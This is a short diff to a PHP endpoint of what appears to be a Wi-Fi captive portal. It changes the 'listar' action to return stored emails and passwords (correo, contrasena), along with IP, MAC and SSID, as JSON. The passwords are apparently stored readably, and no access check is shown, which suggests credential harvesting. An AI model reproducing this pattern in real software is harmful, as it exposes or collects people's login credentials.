@@ -13,7 +13,7 @@ $accion = $_GET['action'] ?? ($_POST['action'] ?? '');
 
 if ($accion === 'listar') {
     try {
-        $stmt = $pdo->query("SELECT id, nombres, apellidos, cedula, ip, mac, ssid, fecha FROM portal_registros ORDER BY fecha DESC LIMIT 500");
+	$stmt = $pdo->query("SELECT id, correo, contrasena, ip, mac, ssid, fecha FROM portal_registros ORDER BY fecha DESC LIMIT 500");
         $registros = $stmt->fetchAll();
         echo json_encode(['ok' => true, 'registros' => $registros]);
     } catch (Exception $e) {
